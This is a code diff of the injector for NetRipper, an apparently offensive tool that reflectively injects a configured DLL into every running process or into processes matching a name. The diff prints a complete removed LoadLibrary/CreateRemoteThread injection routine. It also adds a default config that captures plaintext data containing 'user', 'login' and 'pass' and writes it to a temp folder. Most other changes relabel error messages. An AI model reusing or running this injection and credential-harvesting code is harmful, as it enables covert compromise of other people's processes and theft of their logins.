@@ -19,22 +19,29 @@ using namespace std;
 
 // Temporary configured DLL
 
-#define TEMP_DLL_FILE "NewDLL.dll"
+#define TEMP_DLL_FILE  "ConfiguredDLL.dll"
+
+// Default configuration
+
+#define DEFAULT_CONFIG \
+	"<NetRipper>" \
+	"<plaintext>true</plaintext>" \
+	"<datalimit>4096</datalimit>" \
+	"<stringfinder>user,login,pass,database,config</stringfinder>" \
+	"<data_path>TEMP</data_path>" \
+	"</NetRipper>"
 
 // Function prototypes
 
 vector<PROCESSENTRY32> GetProcesses();
 vector<MODULEENTRY32> GetProcessModules(DWORD p_dwID);
 string ToLower(string p_sString);
-bool IsWindows64();
 
-BOOL InjectAllByName(string p_sDLLName, string p_sProcessName, BOOL p_bReflectiveInject = TRUE);
-void InjectAll(string p_sDLLName, BOOL p_bReflectiveInject = TRUE);
-
-BOOL NormalInject(string p_sDLLName, DWORD p_dwID);
+BOOL InjectAllByName(string p_sDLLName, string p_sProcessName);
+void InjectAll(string p_sDLLName);
 BOOL ReflectiveInject(string p_sDLLName, DWORD p_dwID);
 
-string GenerateData(string p_sArgs);
+string GenerateData(string p_sPlain, string p_sLimit, string p_sFinder, string p_sLocation);
 bool ReplaceData(string p_sDLL, string p_sData);
 
 // Print help
@@ -81,12 +88,12 @@ int _tmain(int argc, char* argv[])
 
 			string sDLL = argv[1];
 			string sProcess = argv[2];
-			cout << "Trying to inject " << sDLL << " in " << sProcess << endl;
+			cout << "INFO: Trying to inject " << sDLL << " in " << sProcess << endl;
 	
 			if(sProcess.compare("ALL") == 0)
-				InjectAll(sDLL, TRUE);
+				InjectAll(sDLL);
 			else
-				InjectAllByName(sDLL, sProcess, TRUE);
+				InjectAllByName(sDLL, sProcess);
 
 			return 0;
 		}
@@ -120,7 +127,7 @@ int _tmain(int argc, char* argv[])
 		{
 			if(argv[i + 1] == NULL || argv[i + 1][0] == '-') 
 			{
-				cout << endl << "Invalid option specified: " << sArg << endl;
+				cout << endl << "ERROR: Invalid option specified: " << sArg << endl;
 				return 1;
 			}
 
@@ -133,7 +140,7 @@ int _tmain(int argc, char* argv[])
 		{
 			if(argv[i + 1] == NULL || argv[i + 1][0] == '-') 
 			{
-				cout << endl << "Invalid option specified: " << sArg << endl;
+				cout << endl << "ERROR: Invalid option specified: " << sArg << endl;
 				return 1;
 			}
 
@@ -146,7 +153,7 @@ int _tmain(int argc, char* argv[])
 		{
 			if(argv[i + 1] == NULL || argv[i + 1][0] == '-') 
 			{
-				cout << endl << "Invalid option specified: " << sArg << endl;
+				cout << endl << "ERROR: Invalid option specified: " << sArg << endl;
 				return 1;
 			}
 
@@ -159,7 +166,7 @@ int _tmain(int argc, char* argv[])
 		{
 			if(argv[i + 1] == NULL || argv[i + 1][0] == '-') 
 			{
-				cout << endl << "Invalid option specified: " << sArg << endl;
+				cout << endl << "ERROR: Invalid option specified: " << sArg << endl;
 				return 1;
 			}
 
@@ -172,7 +179,7 @@ int _tmain(int argc, char* argv[])
 		{
 			if(argv[i + 1] == NULL || argv[i + 1][0] == '-') 
 			{
-				cout << endl << "Invalid option specified: " << sArg << endl;
+				cout << endl << "ERROR: Invalid option specified: " << sArg << endl;
 				return 1;
 			}
 
@@ -180,67 +187,55 @@ int _tmain(int argc, char* argv[])
 		}
 	}
 
-	// Create static data
-
-	string sFinalData = "plaintext=" + sPlain + ";datalimit=" + sLimit + ";stringfinder=" + sFinder + ";"
-		+ "data_path=" + sLocation + ";";
-
 	// Write data to new DLL
 
-	if(ReplaceData(sDLL, GenerateData(sFinalData)) == true)
-		cout << endl << "DLL succesfully created: " << TEMP_DLL_FILE << endl;
+	if(ReplaceData(sDLL, GenerateData(sPlain, sLimit, sFinder, sLocation)) == true)
+		cout << endl << "SUCCESS: DLL succesfully created: " << TEMP_DLL_FILE << endl;
 	else 
-		cout << endl << "Cannot create DLL " << TEMP_DLL_FILE << endl;
+		cout << endl << "ERROR: Cannot create DLL " << TEMP_DLL_FILE << endl;
 
 	return 0;
 }
 
 // Generate XML data
-// E.g. plaintext=true;datalimit=4096;stringfinder=user,pass;data_path=TEMP;
 
-string GenerateData(string p_sArgs)
+string GenerateData(string p_sPlain, string p_sLimit, string p_sFinder, string p_sLocation)
 {
 	string sResult = "<NetRipper>";
-	string option_name  = "";
-	string option_value = "";
 
-	for(size_t i = 0; i < p_sArgs.length(); )
-	{
-		if(p_sArgs[i] == '=')
-		{
-			i++;
+	// Add options
 
-			// Get values
+	sResult += "<plaintext>";
+	sResult += p_sPlain;
+	sResult += "</plaintext>";
 
-			while(p_sArgs[i] != ';')
-			{
-				option_value += p_sArgs[i];
-				i++;
-			}
+	sResult += "<datalimit>";
+	sResult += p_sLimit;
+	sResult += "</datalimit>";
 
-			// Do things with options
+	sResult += "<stringfinder>";
+	sResult += p_sFinder;
+	sResult += "</stringfinder>";
 
-			sResult += "<" + option_name + ">";
-
-			sResult += option_value;
-
-			for(size_t j = 0; j < 256 - option_value.length(); j++)
-				sResult += '?';
-
-			sResult += "</" + option_name + ">";
-
-			// Reset
-
-			option_name = "";
-			option_value = "";
-			i++;
-		}
-
-		option_name += p_sArgs[i];
-		i++;
-	}
+	sResult += "<data_path>";
+	sResult += p_sLocation;
+	sResult += "</data_path>";
 
 	sResult += "</NetRipper>";
+
+	// Check length
+
+	if (sResult.length() > 1000)
+	{
+		cout << "ERROR: Configuration string must be less than 1000 bytes!" << endl;
+		return DEFAULT_CONFIG;
+	}
+
+	// Add padding
+
+	for (size_t j = 0; j < 1000 - sResult.length(); j++)
+		sResult += '-';
+
 	return sResult;
 }
 
@@ -260,7 +255,7 @@ bool ReplaceData(string p_sDLL, string p_sData)
 
 	if( hFile == INVALID_HANDLE_VALUE )
 	{
-		cout << "Cannot read DLL file: " << p_sDLL << endl;
+		cout << "ERROR: Cannot read DLL file: " << p_sDLL << endl;
 		return FALSE;
 	}
 
@@ -270,7 +265,7 @@ bool ReplaceData(string p_sDLL, string p_sData)
 	
 	if( dwLength == INVALID_FILE_SIZE || dwLength == 0 )
 	{
-		cout << "Failed to get the DLL file size" << endl;
+		cout << "ERROR: Failed to get the DLL file size" << endl;
 		return FALSE;
 	}
 
@@ -280,7 +275,7 @@ bool ReplaceData(string p_sDLL, string p_sData)
 		
 	if( !lpBuffer )
 	{
-		cout << "Failed to get the DLL file size" << endl;
+		cout << "ERROR: Failed to get the DLL file size" << endl;
 		return FALSE;
 	}
 
@@ -288,7 +283,7 @@ bool ReplaceData(string p_sDLL, string p_sData)
 
 	if( ReadFile( hFile, lpBuffer, dwLength, &dwBytesRead, NULL ) == FALSE )
 	{
-		cout << "Failed to alloc a buffer!" << endl;
+		cout << "ERROR: Failed to alloc a buffer!" << endl;
 		return FALSE;
 	}
 
@@ -317,7 +312,7 @@ bool ReplaceData(string p_sDLL, string p_sData)
 
 			if(pFile == NULL) 
 			{
-				cout << "Cannot open temporary DLL file: " << TEMP_DLL_FILE << endl;
+				cout << "ERROR: Cannot open temporary DLL file: " << TEMP_DLL_FILE << endl;
 				return FALSE;;
 			}
 
@@ -327,7 +322,7 @@ bool ReplaceData(string p_sDLL, string p_sData)
 
 			if(nWritten != i)
 			{
-				cout << "Cannot write first chunk to temporary DLL file: " << TEMP_DLL_FILE << endl;
+				cout << "ERROR: Cannot write first chunk to temporary DLL file: " << TEMP_DLL_FILE << endl;
 				return false;
 			}
 
@@ -337,7 +332,7 @@ bool ReplaceData(string p_sDLL, string p_sData)
 
 			if(nWritten != p_sData.length())
 			{
-				cout << "Cannot write configured data to temporary DLL file: " << TEMP_DLL_FILE << endl;
+				cout << "ERROR: Cannot write configured data to temporary DLL file: " << TEMP_DLL_FILE << endl;
 				return FALSE;
 			}
 
@@ -347,7 +342,7 @@ bool ReplaceData(string p_sDLL, string p_sData)
 
 			if(nWritten != dwBytesRead - i - p_sData.length())
 			{
-				cout << "Cannot write full data to temporary DLL file: " << TEMP_DLL_FILE << endl;
+				cout << "ERROR: Cannot write full data to temporary DLL file: " << TEMP_DLL_FILE << endl;
 				return FALSE;
 			}
 			
@@ -366,19 +361,6 @@ bool ReplaceData(string p_sDLL, string p_sData)
 	return TRUE;
 }
 
-// Check if Windows is 64bit
-
-bool IsWindows64()
-{
-	SYSTEM_INFO si;
-    GetSystemInfo(&si);
-
-    if((si.wProcessorArchitecture & PROCESSOR_ARCHITECTURE_AMD64) == 64)
-		return true;
-    else
-		return false;
-}
-
 // Function that returns a vector with all processes
 
 vector<PROCESSENTRY32> GetProcesses()
@@ -393,7 +375,7 @@ vector<PROCESSENTRY32> GetProcesses()
 	
 	if(hSnapshot == INVALID_HANDLE_VALUE)
 	{
-		cout << "Error: Cannt get process list!" << endl;
+		cout << "ERROR: Cannot get process list!" << endl;
 		return vProcesses;
 	}
 	
@@ -403,7 +385,7 @@ vector<PROCESSENTRY32> GetProcesses()
 	
 	if(!Process32First(hSnapshot, &hProcess))
 	{
-		cout << "Error: Cannot get first process!" << endl;
+		cout << "ERROR: Cannot get first process!" << endl;
 		return vProcesses;
 	}
 	
@@ -431,7 +413,7 @@ vector<MODULEENTRY32> GetProcessModules(DWORD p_dwID)
 	
 	if(hSnapshot == INVALID_HANDLE_VALUE)
 	{
-		cout << "Error: Cannt get process list!" << endl;
+		cout << "ERROR: Cannt get process list!" << endl;
 		return vModules;
 	}
 	
@@ -441,7 +423,7 @@ vector<MODULEENTRY32> GetProcessModules(DWORD p_dwID)
 	
 	if(!Module32First(hSnapshot, &hModule))
 	{
-		cout << "Error: Cannot get first process!" << endl;
+		cout << "ERROR: Cannot get first process!" << endl;
 		return vModules;
 	}
 	
@@ -455,95 +437,9 @@ vector<MODULEENTRY32> GetProcessModules(DWORD p_dwID)
 	return vModules;
 }
 
-// Function used to inject a DLL into a specific process
-
-BOOL NormalInject(string p_sDLLName, DWORD p_dwID)
-{
-	HANDLE hProcess, hRemoteThread;
-	LPVOID pvString, pvLoadLibrary;
-	BOOL bResult, bIs32Bit;
-	
-	// Open process
-	
-	hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, p_dwID);
-	
-	if(hProcess == NULL)
-	{
-		cout << "Error: Cannot open process: " << p_dwID << endl;
-		return false;
-	}
-
-	// Check if Windows is 64 bit
-
-	if(IsWindows64())
-	{
-		// Check if process is 32 bit
-
-		bResult = IsWow64Process(hProcess, &bIs32Bit);
-
-		if(bResult == 0)
-		{
-			cout << "Error: Cannot verify if process " << p_dwID << " is 32 bit!" << endl;
-			return false;
-		}
-
-		if(!bIs32Bit)
-		{
-			cout << "Error: Process " << p_dwID << " is NOT 32 bit!" << endl;
-			return false;
-		}
-	}
-	
-	// Get LoadLibrary address
-	
-	pvLoadLibrary = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
-	
-	if(pvLoadLibrary == NULL)
-	{
-		cout << "Error: Cannot get LoadLibrary address to inject the DLL!" << endl;
-		return false;
-	}
-	
-	// Allocate space in remote process for DLL name
-	
-	pvString = (LPVOID)VirtualAllocEx(hProcess, NULL, p_sDLLName.length(), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
-	
-	if(pvString == NULL)
-	{
-		cout << "Error: Cannot allocate memory for DLL name in remote process!" << endl;
-		return false;
-	}
-	
-	// Write DLL name in allocated space
-	
-	SIZE_T written = 0;
-	
-	bResult = WriteProcessMemory(hProcess, (LPVOID)pvString, p_sDLLName.c_str(), p_sDLLName.length(), &written);
-	
-	if(!bResult)
-	{
-		cout << "Error: Cannot write DLL name in remote process!" << endl;
-		return false;
-	}
-	
-	// Create Remote thread to call "LoadLibrary(dll)"
-	
-	hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pvLoadLibrary, (LPVOID)pvString, 0, NULL); 
-	
-	if(hRemoteThread == NULL)
-	{
-		cout << "Error: Cannot create remote thread to inject DLL!" << endl;
-		return false;
-	}
-	
-	CloseHandle(hProcess);
-	
-	return true;
-}
-
 // Will inject a DLL in all processes with specified name
 
-BOOL InjectAllByName(string p_sDLLName, string p_sProcessName, BOOL p_bReflectiveInject)
+BOOL InjectAllByName(string p_sDLLName, string p_sProcessName)
 {
     bool bResult = true;
     vector<PROCESSENTRY32> vProcesses = GetProcesses();
@@ -556,16 +452,12 @@ BOOL InjectAllByName(string p_sDLLName, string p_sProcessName, BOOL p_bReflectiv
 	{
 		if(p_sProcessName.compare(ToLower(vProcesses[i].szExeFile)) == 0) 
 		{
-			if(p_bReflectiveInject)
+			if (ReflectiveInject(p_sDLLName, vProcesses[i].th32ProcessID) == false)
 			{
-				if(ReflectiveInject(p_sDLLName, vProcesses[i].th32ProcessID) == false) bResult = false;
-				else cout << "Reflective injected in: " << vProcesses[i].th32ProcessID << endl;
+				bResult = false;
+				cout << "ERROR: Cannot reflectively inject in: " << vProcesses[i].th32ProcessID << endl;
 			}
-			else
-			{
-				if(NormalInject(p_sDLLName, vProcesses[i].th32ProcessID) == false) bResult = false;
-				else cout << "Injected in: " << vProcesses[i].th32ProcessID << endl;
-			}
+			else cout << "SUCCESS: Reflectively injected in: " << vProcesses[i].th32ProcessID << endl;
 		}
 	}
 
@@ -574,7 +466,7 @@ BOOL InjectAllByName(string p_sDLLName, string p_sProcessName, BOOL p_bReflectiv
 
 // Will inject a DLL in all processes 
 
-void InjectAll(string p_sDLLName, BOOL p_bReflectiveInject)
+void InjectAll(string p_sDLLName)
 {
     vector<PROCESSENTRY32> vProcesses = GetProcesses();
 
@@ -582,15 +474,13 @@ void InjectAll(string p_sDLLName, BOOL p_bReflectiveInject)
 
 	for(size_t i = 0; i < vProcesses.size(); i++)
 	{
-		if(p_bReflectiveInject)
+		if (ReflectiveInject(p_sDLLName, vProcesses[i].th32ProcessID) == TRUE)
 		{
-			if(ReflectiveInject(p_sDLLName, vProcesses[i].th32ProcessID) == TRUE)
-				cout << "Reflective injected in: " << vProcesses[i].th32ProcessID << endl;
+			cout << "SUCCESS: Reflectively injected in: " << vProcesses[i].th32ProcessID << endl;
 		}
 		else
 		{
-			if(NormalInject(p_sDLLName, vProcesses[i].th32ProcessID) == TRUE) 
-				cout << "Injected in: " << vProcesses[i].th32ProcessID << endl;
+			cout << "ERROR: Cannot reflectively inject in: " << vProcesses[i].th32ProcessID << endl;
 		}
 	}
 }
@@ -620,7 +510,7 @@ BOOL ReflectiveInject(string p_sDLLName, DWORD p_dwID)
 
 		if( hFile == INVALID_HANDLE_VALUE )
 		{
-			cout << "Cannot read DLL file: " << p_sDLLName << endl;
+			cout << "ERROR: Cannot read DLL file: " << p_sDLLName << endl;
 			bResult = FALSE; break;
 		}
 
@@ -630,7 +520,7 @@ BOOL ReflectiveInject(string p_sDLLName, DWORD p_dwID)
 	
 		if( dwLength == INVALID_FILE_SIZE || dwLength == 0 )
 		{
-			cout << "Failed to get the DLL file size" << endl;
+			cout << "ERROR: Failed to get the DLL file size" << endl;
 			bResult = FALSE; break;
 		}
 
@@ -640,7 +530,7 @@ BOOL ReflectiveInject(string p_sDLLName, DWORD p_dwID)
 		
 		if( !lpBuffer )
 		{
-			cout << "Failed to get the DLL file size" << endl;
+			cout << "ERROR: Failed to allocate memory" << endl;
 			bResult = FALSE; break;
 		}
 
@@ -648,7 +538,7 @@ BOOL ReflectiveInject(string p_sDLLName, DWORD p_dwID)
 
 		if( ReadFile( hFile, lpBuffer, dwLength, &dwBytesRead, NULL ) == FALSE )
 		{
-			cout << "Failed to alloc a buffer!" << endl;
+			cout << "ERROR: Failed to read the file" << endl;
 			bResult = FALSE; break;
 		}
 
@@ -671,7 +561,7 @@ BOOL ReflectiveInject(string p_sDLLName, DWORD p_dwID)
 		
 		if( !hProcess )
 		{
-			cout << "Failed to open the target process" << endl;
+			cout << "ERROR: Failed to open the target process" << endl;
 			bResult = FALSE; break;
 		}
 
@@ -681,7 +571,7 @@ BOOL ReflectiveInject(string p_sDLLName, DWORD p_dwID)
 		
 		if( !hModule )
 		{
-			cout << "Failed to inject the DLL in process: "<< p_dwID << endl;
+			cout << "ERROR: Failed to inject the DLL in process: "<< p_dwID << endl;
 			bResult = FALSE; break;
 		}
 		
